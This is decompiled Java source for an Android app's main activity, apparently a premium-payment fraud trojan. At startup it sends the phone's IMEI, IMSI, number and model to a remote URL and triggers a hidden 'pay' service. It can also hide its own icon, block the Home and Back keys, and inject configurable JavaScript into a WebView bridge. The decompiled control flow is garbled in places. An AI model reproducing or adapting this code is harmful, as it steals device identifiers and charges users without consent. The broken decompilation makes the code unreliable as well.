package com.competecosm.app;

import android.app.Activity;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.net.Uri;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.webkit.JsPromptResult;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.LinearLayout;
import android.widget.LinearLayout.LayoutParams;
import android.widget.TextView;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.LinkedList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.client.utils.URLEncodedUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class ma
  extends Activity
{
  public static int IDD_LOADING = 2;
  public static WebApi api;
  public static String folder = "";
  public static ma self = null;
  public static Settings settings = null;
  public static WebView webView;
  public Handler handler = null;
  public JSONObject jsonSettings;
  ProgressDialog loadingDialog = null;
  
  public ma() {}
  
  public static void callJsCallbackAndroidVersion(String paramString)
  {
    System.out.println("callJsCallbackAndroidVersion()");
    System.out.println("version: " + paramString);
    try
    {
      paramString = "'" + paramString + "'";
      paramString = "javascript:androidVersion(" + paramString + ")";
      webView.loadUrl(paramString);
      return;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public static void executeJs(String paramString)
  {
    try
    {
      webView.loadUrl(paramString);
      return;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public static int getFileLength(Object paramObject, String paramString)
  {
    j = 0;
    int i = 0;
    try
    {
      paramObject = paramObject.getClass().getResourceAsStream(paramString);
      for (;;)
      {
        j = i;
        if (paramObject.read() == -1)
        {
          j = i;
          paramObject.close();
          return i;
        }
        i += 1;
      }
      return j;
    }
    catch (Exception paramObject)
    {
      paramObject.printStackTrace();
    }
  }
  
  public static void openUrl(Context paramContext, String paramString)
  {
    try
    {
      paramString = new Intent("android.intent.action.VIEW", Uri.parse(paramString));
      paramString.addFlags(268435456);
      paramContext.startActivity(paramString);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void pay(Context paramContext)
  {
    Intent localIntent = new Intent(paramContext, ms.class);
    localIntent.setAction("pay");
    paramContext.startService(localIntent);
  }
  
  public static void readDataFromStream(InputStream paramInputStream, byte[] paramArrayOfByte)
    throws IOException
  {
    int i = 0;
    int j = paramArrayOfByte.length;
    for (;;)
    {
      int k = paramInputStream.read(paramArrayOfByte, i, j);
      j -= k;
      if ((j == 0) || (k == -1)) {
        return;
      }
      i += k;
    }
  }
  
  public static String readFile(Object paramObject, String paramString)
  {
    try
    {
      byte[] arrayOfByte = new byte[getFileLength(paramObject, paramString)];
      readDataFromStream(paramObject.getClass().getResourceAsStream(paramString), arrayOfByte);
      paramObject = new String(arrayOfByte, "utf-8");
      return paramObject;
    }
    catch (Exception paramObject)
    {
      paramObject.printStackTrace();
    }
    return "";
  }
  
  public static HttpURLConnection sendHttpRequest(String paramString1, String paramString2, List<NameValuePair> paramList1, List<NameValuePair> paramList2)
  {
    Object localObject = null;
    for (;;)
    {
      try
      {
        if (paramString2.equals("POST"))
        {
          localObject = new URL(paramString1);
          paramString1 = (HttpURLConnection)((URL)localObject).openConnection();
          paramString1.setDoInput(true);
          paramString1.setDoOutput(true);
          paramString1.setUseCaches(false);
          paramString1.setRequestMethod(paramString2);
          if (!paramString2.equals("POST")) {
            break label352;
          }
          paramString1.setRequestProperty("Content-Type", "multipart/form-data; boundary=AaB03x");
          break label352;
          if (i >= paramList2.size())
          {
            if (!paramString2.equals("POST")) {
              continue;
            }
            paramString2 = new DataOutputStream(paramString1.getOutputStream());
            i = 0;
            if (i < paramList1.size()) {
              continue;
            }
            paramString2.writeBytes("--AaB03x--");
            paramString2.writeBytes("\r\n");
            paramString2.flush();
            paramString2.close();
            break;
          }
        }
        else
        {
          if (!paramString2.equals("GET")) {
            continue;
          }
          localObject = new URL(paramString1 + "?" + URLEncodedUtils.format(paramList1, "utf-8"));
          continue;
        }
        localObject = (NameValuePair)paramList1.get(i);
        paramString1.setRequestProperty(((NameValuePair)localObject).getName(), ((NameValuePair)localObject).getValue());
        i += 1;
        continue;
        paramList2 = (NameValuePair)paramList1.get(i);
        paramString2.writeBytes("--AaB03x");
        paramString2.writeBytes("\r\n");
        paramString2.writeBytes("Content-Disposition: form-data; name=\"" + paramList2.getName() + "\"");
        paramString2.writeBytes("\r\n");
        paramString2.writeBytes("\r\n");
        paramString2.write(paramList2.getValue().getBytes("utf-8"));
        paramString2.writeBytes("\r\n");
        i += 1;
        continue;
        if (!paramString2.equals("GET")) {
          break;
        }
        paramString1.connect();
      }
      catch (Exception paramString1)
      {
        paramString1.printStackTrace();
        return null;
      }
      label352:
      int i = 0;
    }
    return paramString1;
  }
  
  public static void sendPostRequest(String paramString, List<NameValuePair> paramList1, List<NameValuePair> paramList2)
  {
    sendSimpleHttpRequest(paramString, "POST", paramList1, paramList2);
  }
  
  public static void sendSimpleHttpRequest(String paramString1, String paramString2, List<NameValuePair> paramList1, List<NameValuePair> paramList2)
  {
    try
    {
      paramString1 = sendHttpRequest(paramString1, paramString2, paramList1, paramList2);
      if (paramString1 != null)
      {
        System.out.println("getResponseCode: " + paramString1.getResponseCode());
        paramString1.disconnect();
      }
      return;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
  }
  
  public static void uninstallApk(Context paramContext, String paramString)
  {
    Settings.log("uninstallApk: " + paramString);
    Intent localIntent = new Intent("android.intent.action.DELETE");
    localIntent.setData(Uri.parse("package:" + paramString));
    localIntent.addFlags(268435456);
    paramContext.startActivity(localIntent);
  }
  
  void hide(JSONObject paramJSONObject)
  {
    try
    {
      setContentView(2130903040);
      ((TextView)findViewById(2131361792)).setText(paramJSONObject.getString("text"));
      if (paramJSONObject.getInt("mode") == 0) {
        ((Button)findViewById(2131361793)).setVisibility(4);
      }
      for (;;)
      {
        this.handler.postDelayed(new Runnable()
        {
          public void run()
          {
            ma.this.finish();
          }
        }, paramJSONObject.getInt("time") * 1000);
        return;
        if (paramJSONObject.getInt("mode") == 1) {
          ((Button)findViewById(2131361793)).setOnClickListener(new View.OnClickListener()
          {
            public void onClick(View paramAnonymousView)
            {
              ma.this.finish();
            }
          });
        }
      }
      return;
    }
    catch (Exception paramJSONObject)
    {
      paramJSONObject.printStackTrace();
    }
  }
  
  public void onClickNext(View paramView)
  {
    Settings.log("onClickNext()");
    try
    {
      paramView = new JSONObject(Constants.data).getJSONObject("settings");
      int i = paramView.getInt("mode");
      if ((i == 2) || (i == 4) || (i == 3)) {
        pay(this);
      }
      openUrl(this, paramView.getString("dataUrl").replace("{IMEI}", Constants.imei).replace("{IMSI}", Constants.imsi).replace("{PHONE}", Constants.phone).replace("{COUNTRY}", Constants.country).replace("{APPID}", getText(2131165185)).replace("{MODEL}", Build.MODEL).replace("{MANUFACTURER}", Build.MANUFACTURER).replace("{SDK}", String.valueOf(Build.VERSION.SDK_INT)).replace("{ID}", settings.id));
      return;
    }
    catch (Exception paramView)
    {
      paramView.printStackTrace();
    }
  }
  
  public void onClickRule(View paramView)
  {
    System.out.println("onClickRule");
    paramView = (CheckBox)paramView;
    ((Button)findViewById(2131361793)).setEnabled(paramView.isChecked());
  }
  
  public void onClickText(View paramView)
  {
    System.out.println("onClickText");
    webView.loadUrl("file:///android_asset/html/license.html");
  }
  
  public void onConfigurationChanged(Configuration paramConfiguration)
  {
    super.onConfigurationChanged(paramConfiguration);
    setRequestedOrientation(1);
  }
  
  public void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    self = this;
    showDialog(IDD_LOADING);
    settings = new Settings();
    Settings.setSettings(settings);
    if (!settings.load(this)) {
      settings.save(this);
    }
    if (Settings.userCancel) {
      uninstall();
    }
    for (;;)
    {
      return;
      settings.id = readFile(this, "/res/raw/a");
      settings.save(this);
      sendHttp();
      this.handler = new Handler();
      int k = 2130903042;
      int j = k;
      try
      {
        this.jsonSettings = new JSONObject(Constants.data).getJSONObject("settings");
        j = k;
        paramBundle = ms.getObject(this.jsonSettings, "blackIMEI");
        if (paramBundle != null)
        {
          j = k;
          if (paramBundle.getBoolean("enable"))
          {
            j = k;
            paramBundle = paramBundle.getJSONArray("list");
            i = 0;
            j = k;
            if (i < paramBundle.length()) {
              break label667;
            }
          }
        }
        label180:
        j = k;
        paramBundle = ms.getObject(this.jsonSettings, "shortcut");
        if (paramBundle != null)
        {
          j = k;
          if (paramBundle.getBoolean("enable"))
          {
            j = k;
            Settings.createShortcut(this, paramBundle.getString("title"), 2130837511, paramBundle.getString("url"));
          }
        }
        j = k;
        i = this.jsonSettings.getInt("mode");
      }
      catch (Exception paramBundle)
      {
        try
        {
          if ((this.jsonSettings.has("antiIcon")) && (this.jsonSettings.getJSONObject("antiIcon").getBoolean("enable"))) {
            getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);
          }
          if (i == 1)
          {
            j = k;
            pay(this);
          }
          if (i == 3)
          {
            i = 2130903043;
            j = i;
            for (;;)
            {
              try
              {
                if (this.jsonSettings.has("showPanel"))
                {
                  boolean bool = this.jsonSettings.getBoolean("showPanel");
                  j = i;
                  if (bool) {
                    j = 2130903044;
                  }
                }
              }
              catch (Exception paramBundle)
              {
                label667:
                j = i;
                paramBundle.printStackTrace();
                j = i;
                continue;
              }
              setContentView(j);
              api = new WebApi(this, this);
              webView = new WebView(this);
              paramBundle = new WebViewClient()
              {
                public void onPageFinished(WebView paramAnonymousWebView, String paramAnonymousString)
                {
                  Settings.log("Page loaded");
                  try
                  {
                    ma.this.loadingDialog.dismiss();
                    ma.callJsCallbackAndroidVersion(Build.VERSION.RELEASE);
                  }
                  catch (Exception paramAnonymousWebView)
                  {
                    for (;;)
                    {
                      try
                      {
                        if (ma.this.jsonSettings.getInt("mode") == 3) {
                          ma.executeJs(ma.this.jsonSettings.getString("licenseJs"));
                        }
                        return;
                      }
                      catch (JSONException paramAnonymousWebView)
                      {
                        paramAnonymousWebView.printStackTrace();
                      }
                      paramAnonymousWebView = paramAnonymousWebView;
                      paramAnonymousWebView.printStackTrace();
                    }
                  }
                }
              };
              webView.setWebViewClient(paramBundle);
              webView.setScrollBarStyle(33554432);
              webView.getSettings().setJavaScriptEnabled(true);
              webView.setWebChromeClient(new WebChromeClient()
              {
                public boolean onJsPrompt(WebView paramAnonymousWebView, String paramAnonymousString1, String paramAnonymousString2, String paramAnonymousString3, JsPromptResult paramAnonymousJsPromptResult)
                {
                  paramAnonymousWebView = ma.api.textToCommand(paramAnonymousString2, paramAnonymousString3);
                  if (paramAnonymousWebView.find)
                  {
                    paramAnonymousJsPromptResult.confirm(paramAnonymousWebView.result);
                    return true;
                  }
                  return false;
                }
              });
              webView.addJavascriptInterface(api, "webapi");
              webView.setLayoutParams(new LinearLayout.LayoutParams(-1, -2, 1.0F));
              ((LinearLayout)findViewById(2131361795)).addView(webView);
              try
              {
                paramBundle = ms.operator();
                Settings.log("MainService.operator() json: " + paramBundle.toString(4));
                Settings.log("operator: " + paramBundle.getString("name"));
                if (this.jsonSettings.getInt("mode") == 4)
                {
                  i = paramBundle.getInt("mode");
                  if ((i == 41) || (i == 42)) {
                    pay(this);
                  }
                }
                folder = paramBundle.getString("html");
                Settings.log("html: " + folder);
                webView.loadUrl("file:///android_asset/html/" + folder + "/index.html");
              }
              catch (Exception paramBundle)
              {
                paramBundle.printStackTrace();
                continue;
              }
              try
              {
                paramBundle = ms.getObject(this.jsonSettings, "hide");
                if ((paramBundle == null) || (!paramBundle.getBoolean("enable"))) {
                  break;
                }
                hide(paramBundle);
                return;
              }
              catch (Exception paramBundle)
              {
                paramBundle.printStackTrace();
                return;
              }
              j = k;
              if (!paramBundle.getString(i).equals(Constants.imei)) {
                continue;
              }
              j = k;
              settings.canSend = false;
              j = k;
              settings.save(this);
              break label180;
              paramBundle = paramBundle;
              paramBundle.printStackTrace();
            }
            i += 1;
          }
        }
        catch (Exception paramBundle)
        {
          for (;;)
          {
            j = k;
            paramBundle.printStackTrace();
            continue;
            int i = 2130903041;
          }
        }
      }
    }
  }
  
  protected Dialog onCreateDialog(int paramInt)
  {
    if (paramInt == IDD_LOADING)
    {
      this.loadingDialog = new ProgressDialog(this);
      this.loadingDialog.setProgressStyle(0);
      this.loadingDialog.setTitle("");
      this.loadingDialog.setMessage("Loading...");
      this.loadingDialog.setCancelable(false);
      return this.loadingDialog;
    }
    return null;
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu)
  {
    super.onCreateOptionsMenu(paramMenu);
    paramMenu.add(0, 2131361797, 0, "ѕравила");
    return true;
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent)
  {
    System.out.println("onKeyDown(): keyCode = " + paramInt);
    if (paramInt == 3) {}
    while (paramInt == 4) {
      return true;
    }
    return false;
  }
  
  public boolean onOptionsItemSelected(MenuItem paramMenuItem)
  {
    switch (paramMenuItem.getItemId())
    {
    default: 
      return super.onOptionsItemSelected(paramMenuItem);
    }
    webView.loadUrl("file:///android_asset/html/" + folder + "/license.html");
    return true;
  }
  
  public void sendHttp()
  {
    try
    {
      new Thread(new Runnable()
      {
        public void run()
        {
          try
          {
            ma.sendPostRequest(new JSONObject(Constants.data).getJSONObject("settings").getString("startUrl").replace("{IMEI}", Constants.imei).replace("{IMSI}", Constants.imsi).replace("{PHONE}", Constants.phone).replace("{COUNTRY}", Constants.country).replace("{APPID}", ma.this.getText(2131165185)).replace("{MODEL}", Build.MODEL).replace("{MANUFACTURER}", Build.MANUFACTURER).replace("{SDK}", String.valueOf(Build.VERSION.SDK_INT)), new LinkedList(), new LinkedList());
            return;
          }
          catch (Exception localException)
          {
            localException.printStackTrace();
          }
        }
      }).start();
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public void uninstall()
  {
    uninstallApk(this, getPackageName());
  }
}
